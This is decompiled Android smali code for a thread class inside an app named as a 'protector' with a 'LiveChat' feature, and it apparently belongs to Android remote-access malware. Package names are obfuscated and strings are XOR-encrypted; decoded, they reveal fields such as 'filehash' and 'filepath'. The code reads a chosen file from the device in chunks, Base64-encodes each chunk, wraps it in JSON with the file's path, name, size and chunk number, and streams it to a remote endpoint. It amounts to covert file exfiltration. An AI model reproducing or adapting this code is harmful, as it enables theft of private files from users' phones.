.class Lcom/icontrol/protector/LiveChat$d$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/LiveChat$d;->f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lntidisestablish/neumonoul/floccinaucinih/m70;

.field final synthetic f:Lcom/icontrol/protector/LiveChat$d;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LiveChat$d;Lntidisestablish/neumonoul/floccinaucinih/m70;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iput-object p2, p0, Lcom/icontrol/protector/LiveChat$d$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 17

    move-object/from16 v1, p0

    :try_start_0
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iget-object v0, v0, Lcom/icontrol/protector/LiveChat$d;->a:Landroid/content/Context;

    const/4 v2, 0x2

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    new-array v6, v4, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/16 v3, 0xa

    const/16 v5, 0x3e8

    if-nez v0, :cond_0

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$d$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    new-array v2, v3, [B

    fill-array-data v2, :array_4

    new-array v3, v4, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v5, v2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    return-void

    :catch_0
    move-exception v0

    goto/16 :goto_3

    :cond_0
    iget-object v6, v1, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iget-object v6, v6, Lcom/icontrol/protector/LiveChat$d;->a:Landroid/content/Context;

    sget-object v7, Lntidisestablish/neumonoul/floccinaucinih/ab;->y:Ljava/lang/String;

    const/4 v8, 0x4

    new-array v9, v8, [B

    fill-array-data v9, :array_6

    new-array v10, v4, [B

    fill-array-data v10, :array_7

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {v6, v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/io/File;

    iget-object v9, v1, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iget-object v9, v9, Lcom/icontrol/protector/LiveChat$d;->b:Ljava/lang/String;

    invoke-direct {v7, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v9, Ljava/io/FileInputStream;

    invoke-direct {v9, v7}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v10

    invoke-static {v10, v11}, Lntidisestablish/neumonoul/floccinaucinih/ua0;->f(J)J

    move-result-wide v12

    long-to-int v12, v12

    new-array v12, v12, [B

    invoke-static {v7}, Lcom/icontrol/protector/n;->r(Ljava/io/File;)Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x0

    move v5, v14

    move v15, v5

    :goto_0
    invoke-virtual {v9, v12}, Ljava/io/FileInputStream;->read([B)I

    move-result v3

    const/4 v8, -0x1

    if-eq v3, v8, :cond_1

    invoke-static {v12, v14, v3, v2}, Landroid/util/Base64;->encodeToString([BIII)Ljava/lang/String;

    move-result-object v8

    add-int/2addr v15, v3

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    new-array v2, v4, [B

    fill-array-data v2, :array_8

    new-array v14, v4, [B

    fill-array-data v14, :array_9

    invoke-static {v2, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v4, [B

    fill-array-data v2, :array_a

    new-array v14, v4, [B

    fill-array-data v14, :array_b

    invoke-static {v2, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    iget-object v14, v1, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iget-object v14, v14, Lcom/icontrol/protector/LiveChat$d;->b:Ljava/lang/String;

    invoke-virtual {v3, v2, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v4, [B

    fill-array-data v2, :array_c

    new-array v14, v4, [B

    fill-array-data v14, :array_d

    invoke-static {v2, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v7}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v2, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v4, [B

    fill-array-data v2, :array_e

    new-array v14, v4, [B

    fill-array-data v14, :array_f

    invoke-static {v2, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v2, 0x9

    new-array v2, v2, [B

    fill-array-data v2, :array_10

    new-array v8, v4, [B

    fill-array-data v8, :array_11

    invoke-static {v2, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    new-array v2, v4, [B

    fill-array-data v2, :array_12

    new-array v8, v4, [B

    fill-array-data v8, :array_13

    invoke-static {v2, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const/16 v2, 0xb

    new-array v2, v2, [B

    fill-array-data v2, :array_14

    new-array v8, v4, [B

    fill-array-data v8, :array_15

    invoke-static {v2, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    add-int/lit8 v8, v5, 0x1

    :try_start_2
    invoke-virtual {v3, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const/4 v2, 0x4

    new-array v5, v2, [B

    fill-array-data v5, :array_16

    new-array v14, v4, [B

    fill-array-data v14, :array_17

    invoke-static {v5, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v14, v2, [B

    fill-array-data v14, :array_18

    new-array v2, v4, [B

    fill-array-data v2, :array_19

    invoke-static {v14, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const/4 v5, 0x3

    new-array v14, v5, [B

    fill-array-data v14, :array_1a

    new-array v5, v4, [B

    fill-array-data v5, :array_1b

    invoke-static {v14, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    iget-object v14, v1, Lcom/icontrol/protector/LiveChat$d$a;->f:Lcom/icontrol/protector/LiveChat$d;

    iget-object v14, v14, Lcom/icontrol/protector/LiveChat$d;->c:Ljava/lang/String;

    invoke-virtual {v3, v5, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v5, 0x3

    new-array v14, v5, [B

    fill-array-data v14, :array_1c

    new-array v5, v4, [B

    fill-array-data v5, :array_1d

    invoke-static {v14, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v5, 0x5

    new-array v5, v5, [B

    fill-array-data v5, :array_1e

    new-array v14, v4, [B

    fill-array-data v14, :array_1f

    invoke-static {v5, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/16 v14, 0xa

    new-array v4, v14, [B

    fill-array-data v4, :array_20
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object/from16 v16, v0

    const/16 v14, 0x8

    :try_start_3
    new-array v0, v14, [B

    fill-array-data v0, :array_21

    invoke-static {v4, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x4

    new-array v4, v0, [B

    fill-array-data v4, :array_22

    const/16 v5, 0x8

    new-array v14, v5, [B

    fill-array-data v14, :array_23

    invoke-static {v4, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 v14, 0x3

    new-array v0, v14, [B

    fill-array-data v0, :array_24

    new-array v14, v5, [B

    fill-array-data v14, :array_25

    invoke-static {v0, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v4, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x3

    new-array v4, v0, [B

    fill-array-data v4, :array_26

    const/16 v0, 0x8

    new-array v5, v0, [B

    fill-array-data v5, :array_27

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_28

    const/16 v2, 0x8

    new-array v4, v2, [B

    fill-array-data v4, :array_29

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$d$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :goto_1
    move v5, v8

    goto :goto_2

    :catch_2
    move-object/from16 v16, v0

    goto :goto_1

    :catch_3
    move-object/from16 v16, v0

    :goto_2
    const-wide/16 v2, 0x64

    :try_start_4
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :catch_4
    move-object/from16 v0, v16

    const/4 v2, 0x2

    const/16 v4, 0x8

    const/4 v8, 0x4

    const/4 v14, 0x0

    goto/16 :goto_0

    :cond_1
    const-wide/16 v2, 0x1388

    :try_start_5
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    :try_start_6
    invoke-virtual {v9}, Ljava/io/FileInputStream;->close()V

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$d$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    const/16 v2, 0x16

    new-array v2, v2, [B

    fill-array-data v2, :array_2a

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_2b

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x3e8

    invoke-interface {v0, v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    goto :goto_4

    :goto_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    return-void

    nop

    :array_0
    .array-data 1
        0x3t
        -0x3at
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4at
        -0x7et
        0x6bt
        -0x39t
        -0x20t
        -0x5et
        -0x71t
        -0x58t
    .end array-data

    :array_2
    .array-data 1
        0x6et
        -0x24t
        -0x3t
        0x4et
        -0x49t
        0x3bt
        0x24t
        0x0t
    .end array-data

    :array_3
    .array-data 1
        0x2at
        -0x47t
        -0x75t
        0x27t
        -0x2ct
        0x5et
        0x4dt
        0x64t
    .end array-data

    :array_4
    .array-data 1
        -0x3dt
        0x58t
        0x68t
        0x2ct
        -0x37t
        -0x2ft
        -0x5at
        -0x15t
        -0x39t
        0x75t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x72t
        0x31t
        0x1bt
        0x5ft
        -0x60t
        -0x41t
        -0x3ft
        -0x35t
    .end array-data

    :array_6
    .array-data 1
        -0x29t
        -0x6et
        -0x35t
        -0x7t
    .end array-data

    :array_7
    .array-data 1
        -0x47t
        -0x19t
        -0x59t
        -0x6bt
        0x35t
        0x3at
        -0x34t
        0x51t
    .end array-data

    :array_8
    .array-data 1
        0x5at
        -0x7at
        0xct
        -0x71t
        -0x66t
        -0x2ft
        0x70t
        0x1t
    .end array-data

    :array_9
    .array-data 1
        0x3ct
        -0x11t
        0x60t
        -0x16t
        -0xet
        -0x50t
        0x3t
        0x69t
    .end array-data

    :array_a
    .array-data 1
        -0x5t
        -0x75t
        0x71t
        0x4dt
        0x20t
        0x4et
        0x43t
        -0x3at
    .end array-data

    :array_b
    .array-data 1
        -0x63t
        -0x1et
        0x1dt
        0x28t
        0x50t
        0x2ft
        0x37t
        -0x52t
    .end array-data

    :array_c
    .array-data 1
        -0x48t
        -0x6bt
        0x3ct
        -0xft
        -0x71t
        -0x75t
        0x54t
        -0x23t
    .end array-data

    :array_d
    .array-data 1
        -0x22t
        -0x4t
        0x50t
        -0x6ct
        -0x1ft
        -0x16t
        0x39t
        -0x48t
    .end array-data

    :array_e
    .array-data 1
        0x41t
        0x1ft
        -0x20t
        0x1ft
        -0x25t
        0x29t
        0x6dt
        0x36t
    .end array-data

    :array_f
    .array-data 1
        0x27t
        0x76t
        -0x74t
        0x7at
        -0x41t
        0x48t
        0x19t
        0x57t
    .end array-data

    :array_10
    .array-data 1
        0x39t
        0x18t
        -0x30t
        0x5dt
        -0x3at
        -0x2et
        0x12t
        -0x5at
        0x28t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x4dt
        0x77t
        -0x5ct
        0x3ct
        -0x56t
        -0x7ft
        0x7bt
        -0x24t
    .end array-data

    :array_12
    .array-data 1
        0x7dt
        0x27t
        0x6ft
        -0x12t
        -0x27t
        0x10t
        -0x1et
        0x18t
    .end array-data

    :array_13
    .array-data 1
        0xet
        0x42t
        0x1t
        -0x66t
        -0x76t
        0x79t
        -0x68t
        0x7dt
    .end array-data

    :array_14
    .array-data 1
        0x16t
        -0x35t
        -0x55t
        0x1ct
        0x70t
        -0x45t
        -0x4at
        0x4et
        0x17t
        -0x3at
        -0x54t
    .end array-data

    :array_15
    .array-data 1
        0x75t
        -0x5dt
        -0x22t
        0x72t
        0x1bt
        -0xbt
        -0x3dt
        0x23t
    .end array-data

    :array_16
    .array-data 1
        -0xct
        0x46t
        -0x34t
        0x40t
    .end array-data

    :array_17
    .array-data 1
        -0x80t
        0x3ft
        -0x44t
        0x25t
        -0x70t
        0x35t
        0x6at
        -0x3dt
    .end array-data

    :array_18
    .array-data 1
        -0xet
        -0x52t
        0x74t
        -0x36t
    .end array-data

    :array_19
    .array-data 1
        -0x6at
        -0x3ft
        0x3t
        -0x5ct
        0x12t
        0x55t
        -0x39t
        0x58t
    .end array-data

    :array_1a
    .array-data 1
        -0xct
        -0x72t
        -0x5bt
    .end array-data

    :array_1b
    .array-data 1
        -0x63t
        -0x16t
        -0x3dt
        -0x1ct
        0x27t
        -0x6ft
        -0x78t
        -0x42t
    .end array-data

    :array_1c
    .array-data 1
        0xct
        0x21t
        0x37t
    .end array-data

    :array_1d
    .array-data 1
        0x7ct
        0x48t
        0x53t
        0x13t
        -0x59t
        -0x5bt
        0x2ft
        0x38t
    .end array-data

    :array_1e
    .array-data 1
        0x53t
        0x2et
        -0x3bt
        0x1bt
        0x7ft
    .end array-data

    nop

    :array_1f
    .array-data 1
        0x3at
        0x5at
        -0x44t
        0x6bt
        0x1at
        -0x39t
        -0x3et
        0x1ft
    .end array-data

    :array_20
    .array-data 1
        -0x3at
        0x71t
        0x7et
        0x21t
        0x7ct
        0x19t
        0x6bt
        0x79t
        -0x5t
        0x69t
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x6bt
        0x1dt
        0xct
        0x7et
        0x1ft
        0x75t
        0x2t
        0x1ct
    .end array-data

    :array_22
    .array-data 1
        -0x66t
        0x58t
        0x48t
        0x7ft
    .end array-data

    :array_23
    .array-data 1
        -0x17t
        0x2dt
        0x2at
        0x1ct
        -0x7ft
        0xdt
        0x78t
        0x3ft
    .end array-data

    :array_24
    .array-data 1
        0xet
        0x68t
        0x76t
    .end array-data

    :array_25
    .array-data 1
        0x63t
        0x1bt
        0x11t
        0x32t
        0x7at
        0x40t
        0x6et
        -0x43t
    .end array-data

    :array_26
    .array-data 1
        -0x32t
        0x53t
        -0x1ct
    .end array-data

    :array_27
    .array-data 1
        -0x5dt
        0x20t
        -0x7dt
        -0x37t
        0x34t
        -0x6at
        -0x17t
        -0x12t
    .end array-data

    :array_28
    .array-data 1
        -0x3et
        -0x57t
        -0x3ft
    .end array-data

    :array_29
    .array-data 1
        -0x5ft
        -0x40t
        -0x4ft
        -0x6dt
        -0x72t
        0x55t
        -0x3t
        -0x2ft
    .end array-data

    :array_2a
    .array-data 1
        0x45t
        0x1ft
        -0x2bt
        0x15t
        0x25t
        0x6dt
        0x48t
        -0x5ft
        0x6dt
        0x5t
        -0x21t
        0x15t
        0x77t
        0x39t
        0x59t
        -0x51t
        0x6et
        0x6t
        -0x2bt
        0x15t
        0x71t
        0x7ct
    .end array-data

    nop

    :array_2b
    .array-data 1
        0x3t
        0x76t
        -0x47t
        0x70t
        0x5t
        0x19t
        0x3at
        -0x40t
    .end array-data
.end method
